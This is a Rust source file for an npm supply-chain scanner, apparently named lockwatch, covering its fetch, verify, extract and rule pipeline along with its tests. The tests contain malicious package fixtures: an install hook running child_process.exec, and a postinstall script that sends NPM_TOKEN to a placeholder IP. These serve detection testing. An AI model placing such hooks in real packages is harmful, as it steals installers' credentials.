//! The scan pipeline: lockfile -> fetch -> verify -> extract -> rules -> report.
//!
//! Network work (downloads) is asynchronous and runs on the tokio runtime,
//! with at most `concurrency` requests in flight. CPU work (unpacking,
//! parsing JavaScript, running rules) runs afterwards on rayon's thread
//! pool, one package per thread. Mixing the two would block tokio's threads
//! with long computations, so the analysis runs inside `spawn_blocking`.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Instant;

use futures::stream::{self, StreamExt};
use rayon::prelude::*;

use crate::cache::Cache;
use crate::context::PackageContext;
use crate::error::{CoreError, Result};
use crate::extract::{extract_tarball, read_root_file, ExtractLimits};
use crate::integrity::Integrity;
use crate::lockfile::{parse_lockfile, LockedPackage, SkippedEntry};
use crate::manifest::Manifest;
use crate::registry::{
    parse_packument, FetchedTarball, Packument, RegistryClient, RegistryOptions,
};
use crate::report::{
    PackageReport, Report, SeverityCounts, SkippedPackage, Summary, TOOL_NAME, TOOL_VERSION,
};
use crate::rules::run_rules;
use crate::score::{risk_level, risk_score};
use crate::time::{self, UnixSeconds};

#[derive(Debug, Clone)]
pub struct ScanOptions {
    pub cache_dir: PathBuf,
    pub registry: RegistryOptions,
    /// Maximum parallel downloads.
    pub concurrency: usize,
    pub limits: ExtractLimits,
    /// Evaluate time-based rules as of this time instead of now (used for
    /// reproducible scans and tests).
    pub now: Option<UnixSeconds>,
}

impl ScanOptions {
    pub fn new(cache_dir: impl Into<PathBuf>) -> Self {
        ScanOptions {
            cache_dir: cache_dir.into(),
            registry: RegistryOptions::default(),
            concurrency: 16,
            limits: ExtractLimits::default(),
            now: None,
        }
    }
}

/// Scan every package in a lockfile.
pub async fn scan_lockfile(path: &Path, opts: &ScanOptions) -> Result<Report> {
    let content = std::fs::read_to_string(path).map_err(|e| CoreError::io(path, e))?;
    let file_name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| path.display().to_string());
    let parsed = parse_lockfile(&file_name, &content)?;
    scan_packages(parsed.packages, parsed.skipped, file_name, opts).await
}

/// Split `name@version`, allowing scoped names (`@scope/name@1.0.0`).
pub fn split_spec(spec: &str) -> Result<(String, String)> {
    // The version separator is the last '@' that is not the first character.
    match spec.rfind('@') {
        Some(at) if at > 0 && at + 1 < spec.len() => {
            Ok((spec[..at].to_string(), spec[at + 1..].to_string()))
        }
        _ => Err(CoreError::InvalidSpec(spec.to_string())),
    }
}

/// Scan a single published package, `name@version`.
pub async fn scan_package_spec(spec: &str, opts: &ScanOptions) -> Result<Report> {
    let (name, version) = split_spec(spec)?;
    let client = RegistryClient::new(Cache::new(&opts.cache_dir), opts.registry.clone())?;
    let packument = client
        .packument(&name, std::slice::from_ref(&version))
        .await?;
    let info = packument.versions.get(&version).ok_or_else(|| {
        CoreError::Metadata(format!("{name} has no version {version} in the registry"))
    })?;
    let pkg = LockedPackage {
        name: name.clone(),
        version: version.clone(),
        resolved: info.tarball.clone(),
        integrity: info.integrity.clone(),
    };
    scan_packages(vec![pkg], Vec::new(), spec.to_string(), opts).await
}

/// What `scan-tarball` knows about a local tarball besides its bytes.
#[derive(Debug, Clone, Default)]
pub struct LocalTarball {
    /// Package name; read from the tarball's package.json when `None`.
    pub name: Option<String>,
    /// Package version; read from the tarball's package.json when `None`.
    pub version: Option<String>,
    /// Expected SRI hash. When given, a mismatch is reported as LW012.
    pub integrity: Option<String>,
    /// Fetch registry metadata for the name (rules LW009 and LW010). Off by
    /// default: a local tarball may not be on the registry at all.
    pub fetch_metadata: bool,
    /// A saved registry metadata document (the JSON served at
    /// `https://registry.npmjs.org/<name>`) to use instead of fetching one.
    pub packument_json: Option<Vec<u8>>,
    /// Shown as `lockfile` in the report (the file name, or "stdin").
    pub label: String,
}

/// Largest tarball accepted by [`scan_tarball`] (same as a registry download).
pub const MAX_LOCAL_TARBALL_BYTES: u64 = 100 * 1024 * 1024;

/// Scan one package tarball that is already on disk (or piped in), without
/// a lockfile. Nothing is downloaded unless `fetch_metadata` is set.
pub async fn scan_tarball(
    bytes: Vec<u8>,
    local: LocalTarball,
    opts: &ScanOptions,
) -> Result<Report> {
    let started = Instant::now();
    let now = opts.now.unwrap_or_else(time::now);
    if bytes.len() as u64 > MAX_LOCAL_TARBALL_BYTES {
        return Err(CoreError::InvalidArchive(format!(
            "tarball is larger than {MAX_LOCAL_TARBALL_BYTES} bytes"
        )));
    }
    let manifest = read_root_file(&bytes, "package.json", 1024 * 1024, &opts.limits)
        .and_then(|b| Manifest::parse(&b));
    let from_manifest = |field: fn(&Manifest) -> Option<&str>| {
        manifest.as_ref().and_then(field).map(str::to_string)
    };
    let pkg = LockedPackage {
        name: local
            .name
            .or_else(|| from_manifest(Manifest::name))
            .unwrap_or_else(|| "unknown".to_string()),
        version: local
            .version
            .or_else(|| from_manifest(Manifest::version))
            .unwrap_or_else(|| "0.0.0".to_string()),
        resolved: None,
        integrity: local.integrity,
    };

    let metadata = if let Some(json) = &local.packument_json {
        Some(parse_packument(&pkg.name, json).map_err(|e| e.to_string()))
    } else if local.fetch_metadata {
        let client = RegistryClient::new(Cache::new(&opts.cache_dir), opts.registry.clone())?;
        Some(
            client
                .packument(&pkg.name, std::slice::from_ref(&pkg.version))
                .await
                .map_err(|e| e.to_string()),
        )
    } else {
        None
    };

    let limits = opts.limits;
    let outcome = tokio::task::spawn_blocking(move || {
        on_analysis_pool(|| analyse_bytes(&pkg, &bytes, metadata.as_ref(), &limits, now))
    })
    .await
    .map_err(|e| CoreError::Metadata(format!("analysis task failed: {e}")))?;
    Ok(build_report(
        vec![outcome],
        Vec::new(),
        local.label,
        now,
        started,
    ))
}

/// The result of analysing one package.
enum Outcome {
    Scanned(PackageReport),
    Skipped(SkippedPackage),
}

/// Fetch and analyse a list of packages and build the report.
pub async fn scan_packages(
    packages: Vec<LockedPackage>,
    lockfile_skipped: Vec<SkippedEntry>,
    label: String,
    opts: &ScanOptions,
) -> Result<Report> {
    let started = Instant::now();
    let now = opts.now.unwrap_or_else(time::now);
    // `Arc` (atomically reference-counted pointer) lets the many concurrent
    // download futures share one client.
    let client = Arc::new(RegistryClient::new(
        Cache::new(&opts.cache_dir),
        opts.registry.clone(),
    )?);
    let concurrency = opts.concurrency.max(1);

    // Phase 1 (async): registry metadata once per package name, and
    // tarballs, both with bounded concurrency. `buffer_unordered(n)` runs up
    // to n futures at a time and yields results as they finish.
    let mut versions_by_name: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for p in &packages {
        versions_by_name
            .entry(p.name.clone())
            .or_default()
            .push(p.version.clone());
    }
    let metadata_future = stream::iter(versions_by_name)
        .map(|(name, versions)| {
            let client = Arc::clone(&client);
            async move {
                let result = client.packument(&name, &versions).await;
                (name, result)
            }
        })
        .buffer_unordered(concurrency)
        .collect::<Vec<_>>();
    let tarball_future = stream::iter(packages.iter().cloned().enumerate())
        .map(|(index, pkg)| {
            let client = Arc::clone(&client);
            async move { (index, client.ensure_tarball(&pkg).await) }
        })
        .buffer_unordered(concurrency)
        .collect::<Vec<_>>();
    let (metadata_results, mut tarball_results) = tokio::join!(metadata_future, tarball_future);
    tarball_results.sort_by_key(|(index, _)| *index);

    let metadata: BTreeMap<String, std::result::Result<Packument, String>> = metadata_results
        .into_iter()
        .map(|(name, r)| (name, r.map_err(|e| e.to_string())))
        .collect();

    // Phase 2 (CPU): analyse each package on the rayon pool.
    let limits = opts.limits;
    let jobs: Vec<(LockedPackage, Result<FetchedTarball>)> = packages
        .into_iter()
        .zip(tarball_results.into_iter().map(|(_, r)| r))
        .collect();
    let outcomes = tokio::task::spawn_blocking(move || {
        let analyse = || {
            jobs.into_par_iter()
                .map(|(pkg, fetched)| {
                    let meta = metadata.get(&pkg.name);
                    analyse_package(&pkg, fetched, meta, &limits, now)
                })
                .collect::<Vec<Outcome>>()
        };
        on_analysis_pool(analyse)
    })
    .await
    .map_err(|e| CoreError::Metadata(format!("analysis task failed: {e}")))?;

    Ok(build_report(
        outcomes,
        lockfile_skipped,
        label,
        now,
        started,
    ))
}

/// Run `f` on a dedicated rayon pool with large (16 MB) stacks: parsing and
/// walking deeply nested, attacker-written JavaScript recurses deeply.
fn on_analysis_pool<T: Send>(f: impl FnOnce() -> T + Send) -> T {
    match rayon::ThreadPoolBuilder::new()
        .stack_size(16 * 1024 * 1024)
        .build()
    {
        Ok(pool) => pool.install(f),
        Err(_) => f(),
    }
}

/// Assemble the report from per-package outcomes.
fn build_report(
    outcomes: Vec<Outcome>,
    lockfile_skipped: Vec<SkippedEntry>,
    label: String,
    now: UnixSeconds,
    started: Instant,
) -> Report {
    let mut reports = Vec::new();
    let mut skipped: Vec<SkippedPackage> = lockfile_skipped
        .into_iter()
        .map(|s| SkippedPackage {
            name: s.name,
            version: s.version,
            reason: s.reason,
            error: false,
        })
        .collect();
    for outcome in outcomes {
        match outcome {
            Outcome::Scanned(r) => reports.push(r),
            Outcome::Skipped(s) => skipped.push(s),
        }
    }
    reports.sort_by(|a, b| {
        b.risk_score
            .cmp(&a.risk_score)
            .then_with(|| a.name.cmp(&b.name))
            .then_with(|| a.version.cmp(&b.version))
    });

    let mut counts = SeverityCounts::default();
    for f in reports.iter().flat_map(|r| &r.findings) {
        counts.add(f.severity);
    }
    Report {
        tool: TOOL_NAME.to_string(),
        version: TOOL_VERSION.to_string(),
        scanned_at: time::format_rfc3339(now),
        lockfile: label,
        summary: Summary {
            packages_total: reports.len() + skipped.len(),
            packages_scanned: reports.len(),
            packages_skipped: skipped.len(),
            findings: counts,
            duration_ms: u64::try_from(started.elapsed().as_millis()).unwrap_or(u64::MAX),
        },
        packages: reports,
        skipped,
    }
}

/// Verify, extract and run the rules on one package (runs on a rayon thread).
fn analyse_package(
    pkg: &LockedPackage,
    fetched: Result<FetchedTarball>,
    metadata: Option<&std::result::Result<Packument, String>>,
    limits: &ExtractLimits,
    now: UnixSeconds,
) -> Outcome {
    let skipped = |reason: String| {
        Outcome::Skipped(SkippedPackage {
            name: pkg.name.clone(),
            version: Some(pkg.version.clone()),
            reason,
            error: true,
        })
    };

    let ctx = match fetched {
        Err(CoreError::DisallowedUrl { url, reason }) => {
            return Outcome::Skipped(SkippedPackage {
                name: pkg.name.clone(),
                version: Some(pkg.version.clone()),
                reason: format!("not fetched: {reason} ({url})"),
                error: false,
            })
        }
        Err(e) => return skipped(format!("error: {e}")),
        Ok(FetchedTarball::IntegrityMismatch { expected, actual }) => {
            PackageContext::integrity_failure(&pkg.name, &pkg.version, expected, actual, now)
        }
        Ok(FetchedTarball::Cached(path)) => {
            let bytes = match std::fs::read(&path) {
                Ok(b) => b,
                Err(e) => return skipped(format!("error: cannot read {}: {e}", path.display())),
            };
            return analyse_bytes(pkg, &bytes, metadata, limits, now);
        }
    };
    rules_and_score(pkg, ctx)
}

/// Verify `bytes` against the package's integrity (if any), extract them
/// and run the rules. Shared by lockfile scans (tarball read from the cache)
/// and `scan-tarball` (a local file).
fn analyse_bytes(
    pkg: &LockedPackage,
    bytes: &[u8],
    metadata: Option<&std::result::Result<Packument, String>>,
    limits: &ExtractLimits,
    now: UnixSeconds,
) -> Outcome {
    let skipped = |reason: String| {
        Outcome::Skipped(SkippedPackage {
            name: pkg.name.clone(),
            version: Some(pkg.version.clone()),
            reason,
            error: true,
        })
    };
    // Re-verify on every read: catches a corrupted or tampered cache.
    let mismatch = match pkg.integrity.as_deref().map(Integrity::parse) {
        Some(Ok(expected)) if !expected.matches(bytes) => Some((
            expected.to_sri(),
            Integrity::of(expected.algorithm, bytes).to_sri(),
        )),
        Some(Err(e)) => return skipped(format!("error: {e}")),
        _ => None,
    };
    let ctx = if let Some((expected, actual)) = mismatch {
        PackageContext::integrity_failure(&pkg.name, &pkg.version, expected, actual, now)
    } else {
        let dir = match tempfile::Builder::new().prefix("lockwatch-").tempdir() {
            Ok(d) => d,
            Err(e) => return skipped(format!("error: cannot create temp dir: {e}")),
        };
        let extraction = match extract_tarball(bytes, dir.path(), limits) {
            Ok(x) => x,
            Err(e) => return skipped(format!("error: {e}")),
        };
        let (packument, meta_warning) = match metadata {
            Some(Ok(p)) => (Some(p.clone()), None),
            Some(Err(e)) => (
                None,
                Some(format!(
                    "registry metadata unavailable, LW009 and LW010 not checked ({e})"
                )),
            ),
            None => (None, None),
        };
        let mut ctx = PackageContext::from_extraction(
            &pkg.name,
            &pkg.version,
            dir.path(),
            extraction,
            packument,
            now,
        );
        ctx.warnings.extend(meta_warning);
        ctx
        // `dir` is dropped here and the temporary files are deleted.
    };
    rules_and_score(pkg, ctx)
}

fn rules_and_score(pkg: &LockedPackage, ctx: PackageContext) -> Outcome {
    let (findings, rule_warnings) = run_rules(&ctx);
    let score = risk_score(&findings);
    let mut warnings = ctx.warnings;
    warnings.extend(rule_warnings);
    Outcome::Scanned(PackageReport {
        name: pkg.name.clone(),
        version: pkg.version.clone(),
        risk_score: score,
        risk_level: risk_level(score),
        findings,
        warnings,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::integrity::Algorithm;
    use crate::score::RiskLevel;
    use crate::test_support::{build_tgz, MockRegistry};

    #[test]
    fn splits_specs() {
        assert_eq!(
            split_spec("@scope/pkg@1.2.3").expect("valid"),
            ("@scope/pkg".to_string(), "1.2.3".to_string())
        );
        assert_eq!(
            split_spec("left-pad@1.3.0").expect("valid"),
            ("left-pad".to_string(), "1.3.0".to_string())
        );
        assert!(split_spec("left-pad").is_err());
        assert!(split_spec("@scope/pkg").is_err());
        assert!(split_spec("x@").is_err());
    }

    fn locked(name: &str, tgz: &[u8]) -> LockedPackage {
        LockedPackage {
            name: name.into(),
            version: "1.0.0".into(),
            resolved: None,
            integrity: Some(Integrity::of(Algorithm::Sha512, tgz).to_sri()),
        }
    }

    #[tokio::test]
    async fn scans_a_local_tarball_without_network() {
        let tgz = build_tgz(&[
            (
                "package/package.json",
                br#"{"name":"local-evil","version":"2.0.0","scripts":{"preinstall":"node i.js"}}"#
                    .as_slice(),
            ),
            ("package/i.js", b"require('child_process').exec('id');"),
        ]);
        let dir = tempfile::tempdir().expect("tempdir");
        let mut opts = ScanOptions::new(dir.path());
        // Any network access would fail: offline with an empty cache.
        opts.registry.offline = true;
        let local = LocalTarball {
            label: "evil.tgz".into(),
            ..LocalTarball::default()
        };
        let report = scan_tarball(tgz.clone(), local, &opts).await.expect("scan");
        assert_eq!(report.lockfile, "evil.tgz");
        let p = &report.packages[0];
        assert_eq!(
            (p.name.as_str(), p.version.as_str()),
            ("local-evil", "2.0.0")
        );
        let ids: Vec<&str> = p.findings.iter().map(|f| f.rule_id.as_str()).collect();
        assert_eq!(ids, ["LW001", "LW003"]);

        // An explicit name wins, and a wrong integrity is LW012.
        let local = LocalTarball {
            name: Some("renamed".into()),
            integrity: Some(Integrity::of(Algorithm::Sha512, b"other").to_sri()),
            label: "x".into(),
            ..LocalTarball::default()
        };
        let report = scan_tarball(tgz.clone(), local, &opts).await.expect("scan");
        assert_eq!(report.packages[0].name, "renamed");
        assert_eq!(report.packages[0].findings[0].rule_id, "LW012");

        // A saved registry document feeds the metadata rules (LW010 here).
        let doc = br#"{"versions": {
              "1.0.0": {"_npmUser": {"name": "alice"}},
              "2.0.0": {"_npmUser": {"name": "mallory"}}},
            "time": {"1.0.0": "2020-01-01T00:00:00Z", "2.0.0": "2020-02-01T00:00:00Z"}}"#;
        let local = LocalTarball {
            packument_json: Some(doc.to_vec()),
            ..LocalTarball::default()
        };
        let report = scan_tarball(tgz.clone(), local, &opts).await.expect("scan");
        let ids: Vec<&str> = report.packages[0]
            .findings
            .iter()
            .map(|f| f.rule_id.as_str())
            .collect();
        assert_eq!(ids, ["LW001", "LW003", "LW010"]);

        // Not a tarball: reported as skipped with an error.
        let report = scan_tarball(b"junk".to_vec(), LocalTarball::default(), &opts)
            .await
            .expect("scan");
        assert!(report.is_incomplete());
        assert_eq!(report.skipped[0].name, "unknown");
    }

    #[tokio::test]
    async fn end_to_end_against_mock_registry() {
        let evil = build_tgz(&[
            (
                "package/package.json",
                br#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"node i.js"}}"#
                    .as_slice(),
            ),
            (
                "package/i.js",
                b"require('https').get('https://203.0.113.5/x?t=' + process.env.NPM_TOKEN);",
            ),
        ]);
        let good = build_tgz(&[(
            "package/package.json",
            br#"{"name":"good","version":"1.0.0"}"#.as_slice(),
        )]);
        let server = MockRegistry::start(vec![
            ("/evil/-/evil-1.0.0.tgz", 200, evil.clone()),
            ("/good/-/good-1.0.0.tgz", 200, good.clone()),
        ])
        .await;
        let dir = tempfile::tempdir().expect("tempdir");
        let mut opts = ScanOptions::new(dir.path());
        opts.registry.registry = server.url.clone();
        opts.registry.retries = 0;

        let mut tampered = locked("good", &good);
        tampered.version = "1.0.0".into();
        let mut missing = locked("missing", b"x");
        missing.version = "2.0.0".into();
        let report = scan_packages(
            vec![locked("evil", &evil), locked("good", &good), missing],
            vec![SkippedEntry {
                name: "local".into(),
                version: None,
                reason: "file: dependency".into(),
            }],
            "package-lock.json".into(),
            &opts,
        )
        .await
        .expect("scan");

        assert_eq!(report.summary.packages_total, 4);
        assert_eq!(report.summary.packages_scanned, 2);
        assert_eq!(report.packages[0].name, "evil");
        assert_eq!(report.packages[0].risk_level, RiskLevel::Critical);
        let ids: Vec<&str> = report.packages[0]
            .findings
            .iter()
            .map(|f| f.rule_id.as_str())
            .collect();
        assert_eq!(ids, ["LW001", "LW004", "LW004", "LW005"]);
        assert_eq!(report.packages[1].risk_score, 0);
        // Metadata 404s are warnings, not errors.
        assert!(report.packages[1].warnings[0].contains("registry metadata unavailable"));
        assert!(report.is_incomplete());
        assert!(report
            .skipped
            .iter()
            .any(|s| s.name == "missing" && s.error));
        assert!(report.skipped.iter().any(|s| s.name == "local" && !s.error));

        // Tamper with the cached tarball: the next (offline) scan reports LW012.
        let key = Integrity::of(Algorithm::Sha512, &good).cache_key();
        std::fs::write(Cache::new(dir.path()).tarball_path(&key), b"tampered").expect("write");
        opts.registry.offline = true;
        let report = scan_packages(vec![tampered], vec![], "x".into(), &opts)
            .await
            .expect("scan");
        assert_eq!(report.packages[0].findings[0].rule_id, "LW012");
        assert_eq!(report.packages[0].risk_level, RiskLevel::High);
    }
}
